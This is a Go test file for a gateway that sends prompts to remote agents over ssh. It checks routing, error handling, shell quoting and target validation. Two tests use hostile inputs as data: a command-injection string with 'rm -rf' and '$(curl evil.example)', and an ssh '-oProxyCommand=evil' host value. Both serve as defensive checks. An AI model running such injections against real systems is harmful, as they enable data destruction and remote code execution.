package remoteprompt

import (
	"context"
	"errors"
	"strings"
	"testing"

	"github.com/permgps/herdr-telegram-agents/internal/domain"
)

// recordingGateway is the inner gateway a test decorates. It records
// prompts and key presses; like the decorator itself it satisfies the port
// by embedding the interface, so tests only override what they call.
type recordingGateway struct {
	domain.HerdrGateway
	prompts [][2]string
	keys    [][]string
}

func (g *recordingGateway) Prompt(_ context.Context, target, text string) error {
	g.prompts = append(g.prompts, [2]string{target, text})
	return nil
}

func (g *recordingGateway) SendKeys(_ context.Context, _ string, keys []string) error {
	g.keys = append(g.keys, keys)
	return nil
}

// runResponse is one scripted answer of the fake runner.
type runResponse struct {
	stdout string
	stderr string
	err    error
}

// fakeRunner records every argv it is asked to run and answers with the
// next scripted response.
type fakeRunner struct {
	calls [][]string
	resps []runResponse
}

func (r *fakeRunner) Run(_ context.Context, argv []string) ([]byte, []byte, error) {
	r.calls = append(r.calls, argv)
	if i := len(r.calls) - 1; i < len(r.resps) {
		return []byte(r.resps[i].stdout), []byte(r.resps[i].stderr), r.resps[i].err
	}
	return nil, nil, nil
}

// fakeResolver answers every Mirror with one scripted result.
type fakeResolver struct {
	target Target
	ok     bool
	err    error
	asked  []string
}

func (r *fakeResolver) Mirror(pane string) (Target, bool, error) {
	r.asked = append(r.asked, pane)
	return r.target, r.ok, r.err
}

// remoteAgentList is what `herdr agent list` prints for two agents.
const remoteAgentList = `{"id":"cli:agent:list","result":{"agents":[
  {"agent":"pi","pane_id":"wR:p2","terminal_id":"term_65beab1fe46b12"},
  {"agent":"pi","pane_id":"wR:p9","terminal_id":"term_65beb4e1030c23"}
],"type":"agent_list"}}
`

// remotePrompted is what `herdr agent prompt` prints on success.
const remotePrompted = `{"id":"cli:agent:prompt","result":{"agent":{"pane_id":"wR:p9"}},"type":"agent_prompted"}`

func remoteTarget() Target {
	return Target{Host: "hermesbox", Bin: "/home/amit/.local/bin/herdr", Terminal: "term_65beb4e1030c23"}
}

// remoteCommand is the last element of a runner argv: the shell string ssh
// hands to the remote login shell.
func remoteCommandOf(argv []string) string { return argv[len(argv)-1] }

func TestPromptDelegatesLocalWhenPaneIsNoMirror(t *testing.T) {
	inner, resolver, runner := &recordingGateway{}, &fakeResolver{}, &fakeRunner{}
	g := NewGateway(inner, resolver, runner, nil)
	if err := g.Prompt(context.Background(), "w1:p1", "hello"); err != nil {
		t.Fatal(err)
	}
	if len(inner.prompts) != 1 || inner.prompts[0] != [2]string{"w1:p1", "hello"} {
		t.Fatalf("inner prompts = %v", inner.prompts)
	}
	if len(runner.calls) != 0 {
		t.Fatalf("runner was called: %v", runner.calls)
	}
	if len(resolver.asked) != 1 || resolver.asked[0] != "w1:p1" {
		t.Fatalf("resolver asked = %v", resolver.asked)
	}
}

func TestPromptRoutesMirrorToRemoteAgent(t *testing.T) {
	inner := &recordingGateway{}
	resolver := &fakeResolver{target: remoteTarget(), ok: true}
	runner := &fakeRunner{resps: []runResponse{{stdout: remoteAgentList}, {stdout: remotePrompted}}}
	g := NewGateway(inner, resolver, runner, nil)
	if err := g.Prompt(context.Background(), "wR:p3", "hello there"); err != nil {
		t.Fatal(err)
	}
	if len(runner.calls) != 2 {
		t.Fatalf("runner calls = %d: %v", len(runner.calls), runner.calls)
	}
	listArgv := runner.calls[0]
	if got, want := remoteCommandOf(listArgv),
		"env -u HERDR_SOCKET_PATH -u HERDR_CLIENT_SOCKET_PATH /home/amit/.local/bin/herdr agent list"; got != want {
		t.Fatalf("list command =\n%q\nwant\n%q", got, want)
	}
	promptArgv := runner.calls[1]
	if got, want := remoteCommandOf(promptArgv),
		"env -u HERDR_SOCKET_PATH -u HERDR_CLIENT_SOCKET_PATH /home/amit/.local/bin/herdr agent prompt wR:p9 'hello there'"; got != want {
		t.Fatalf("prompt command =\n%q\nwant\n%q", got, want)
	}
	if host := listArgv[len(listArgv)-2]; host != "hermesbox" {
		t.Fatalf("ssh target = %q", host)
	}
	if sep := listArgv[len(listArgv)-3]; sep != "--" {
		t.Fatalf("target not behind --: %v", listArgv)
	}
	if len(inner.prompts) != 0 {
		t.Fatalf("inner was prompted: %v", inner.prompts)
	}
}

func TestPromptQuotesHostileText(t *testing.T) {
	resolver := &fakeResolver{target: remoteTarget(), ok: true}
	runner := &fakeRunner{resps: []runResponse{{stdout: remoteAgentList}, {stdout: remotePrompted}}}
	g := NewGateway(&recordingGateway{}, resolver, runner, nil)
	text := `deploy; rm -rf /tmp/x && echo 'pwned' $(curl evil.example)`
	if err := g.Prompt(context.Background(), "wR:p3", text); err != nil {
		t.Fatal(err)
	}
	command := remoteCommandOf(runner.calls[1])
	want := "agent prompt wR:p9 '" + strings.ReplaceAll(text, "'", `'\''`) + "'"
	if !strings.Contains(command, want) {
		t.Fatalf("prompt command %q does not carry %q", command, want)
	}
}

func TestPromptRemoteAgentGoneWhenTerminalUnmatched(t *testing.T) {
	target := remoteTarget()
	target.Terminal = "term_missing"
	resolver := &fakeResolver{target: target, ok: true}
	runner := &fakeRunner{resps: []runResponse{{stdout: remoteAgentList}}}
	g := NewGateway(&recordingGateway{}, resolver, runner, nil)
	err := g.Prompt(context.Background(), "wR:p3", "hello")
	if !errors.Is(err, domain.ErrAgentGone) {
		t.Fatalf("err = %v, want ErrAgentGone", err)
	}
	if len(runner.calls) != 1 {
		t.Fatalf("runner calls = %d, want only the list", len(runner.calls))
	}
}

func TestPromptRemoteSurfacesSSHFailure(t *testing.T) {
	resolver := &fakeResolver{target: remoteTarget(), ok: true}
	runner := &fakeRunner{resps: []runResponse{{
		stderr: "ssh: connect to host hermesbox port 22: Connection refused",
		// system.ExecRunner embeds the first stderr line in its error.
		err: errors.New("ssh: exit status 255: ssh: connect to host hermesbox port 22: Connection refused"),
	}}}
	g := NewGateway(&recordingGateway{}, resolver, runner, nil)
	err := g.Prompt(context.Background(), "wR:p3", "hello")
	if err == nil || !strings.Contains(err.Error(), "hermesbox") ||
		!strings.Contains(err.Error(), "Connection refused") {
		t.Fatalf("err = %v", err)
	}
}

func TestPromptRemoteErrorEnvelopeBecomesAgentGone(t *testing.T) {
	resolver := &fakeResolver{target: remoteTarget(), ok: true}
	runner := &fakeRunner{resps: []runResponse{
		{stdout: remoteAgentList},
		{stdout: `{"error":{"code":"agent_not_found","message":"no agent for wR:p9"}}`,
			err: errors.New("herdr agent prompt: exit status 1")},
	}}
	g := NewGateway(&recordingGateway{}, resolver, runner, nil)
	err := g.Prompt(context.Background(), "wR:p3", "hello")
	if !errors.Is(err, domain.ErrAgentGone) || !strings.Contains(err.Error(), "no agent for wR:p9") {
		t.Fatalf("err = %v", err)
	}
}

func TestPromptRemoteBlockedEnvelopeSurfaces(t *testing.T) {
	resolver := &fakeResolver{target: remoteTarget(), ok: true}
	runner := &fakeRunner{resps: []runResponse{
		{stdout: remoteAgentList},
		{stdout: `{"error":{"code":"agent_blocked","message":"agent is blocked"}}`,
			err: errors.New("herdr agent prompt: exit status 1")},
	}}
	g := NewGateway(&recordingGateway{}, resolver, runner, nil)
	err := g.Prompt(context.Background(), "wR:p3", "hello")
	if err == nil || !strings.Contains(err.Error(), "agent_blocked") {
		t.Fatalf("err = %v", err)
	}
	if errors.Is(err, domain.ErrAgentGone) {
		t.Fatalf("blocked is not gone: %v", err)
	}
}

func TestPromptResolverErrorSurfaces(t *testing.T) {
	resolver := &fakeResolver{err: errors.New("remote-panes config unreadable")}
	runner := &fakeRunner{}
	g := NewGateway(&recordingGateway{}, resolver, runner, nil)
	err := g.Prompt(context.Background(), "wR:p3", "hello")
	if err == nil || !strings.Contains(err.Error(), "remote-panes config unreadable") {
		t.Fatalf("err = %v", err)
	}
	if len(runner.calls) != 0 {
		t.Fatalf("runner was called: %v", runner.calls)
	}
}

func TestPromptRejectsUnusableTarget(t *testing.T) {
	cases := []Target{
		{Host: "-oProxyCommand=evil", Terminal: "term_a", Bin: "/h"},
		{Host: "", Terminal: "term_a", Bin: "/h"},
		{Host: "hermesbox", Terminal: "term; x", Bin: "/h"},
	}
	for i, target := range cases {
		resolver := &fakeResolver{target: target, ok: true}
		runner := &fakeRunner{}
		g := NewGateway(&recordingGateway{}, resolver, runner, nil)
		err := g.Prompt(context.Background(), "wR:p3", "hello")
		if err == nil || !strings.Contains(err.Error(), "unusable") {
			t.Fatalf("case %d: err = %v", i, err)
		}
		if len(runner.calls) != 0 {
			t.Fatalf("case %d: runner was called: %v", i, runner.calls)
		}
	}
}

func TestPromptEmptyTextFailsBeforeSSH(t *testing.T) {
	resolver := &fakeResolver{target: remoteTarget(), ok: true}
	runner := &fakeRunner{}
	g := NewGateway(&recordingGateway{}, resolver, runner, nil)
	if err := g.Prompt(context.Background(), "wR:p3", ""); err == nil {
		t.Fatal("empty text was accepted")
	}
	if len(runner.calls) != 0 {
		t.Fatalf("runner was called: %v", runner.calls)
	}
}

func TestSendKeysNeverGoesRemote(t *testing.T) {
	inner := &recordingGateway{}
	resolver := &fakeResolver{target: remoteTarget(), ok: true}
	runner := &fakeRunner{}
	g := NewGateway(inner, resolver, runner, nil)
	if err := g.SendKeys(context.Background(), "wR:p3", []string{"enter"}); err != nil {
		t.Fatal(err)
	}
	if len(inner.keys) != 1 || len(inner.keys[0]) != 1 || inner.keys[0][0] != "enter" {
		t.Fatalf("inner keys = %v", inner.keys)
	}
	if len(runner.calls) != 0 {
		t.Fatalf("runner was called: %v", runner.calls)
	}
}

func TestGatewayWithRealResolverEndToEnd(t *testing.T) {
	statePath, configPath := writeBoth(t, liveState, liveConfig)
	resolver := NewRemotePanes(statePath, configPath, nil)
	runner := &fakeRunner{resps: []runResponse{{stdout: remoteAgentList}, {stdout: remotePrompted}}}
	inner := &recordingGateway{}
	g := NewGateway(inner, resolver, runner, nil)

	if err := g.Prompt(context.Background(), "wR:p3", "ship it"); err != nil {
		t.Fatal(err)
	}
	if len(runner.calls) != 2 {
		t.Fatalf("runner calls = %d", len(runner.calls))
	}
	if got := remoteCommandOf(runner.calls[1]); !strings.Contains(got, "agent prompt 'wR:p9'") &&
		!strings.Contains(got, "agent prompt wR:p9 ") {
		t.Fatalf("prompt command = %q", got)
	}

	if err := g.Prompt(context.Background(), "w1:p1", "local please"); err != nil {
		t.Fatal(err)
	}
	if len(inner.prompts) != 1 || inner.prompts[0][1] != "local please" {
		t.Fatalf("inner prompts = %v", inner.prompts)
	}
}
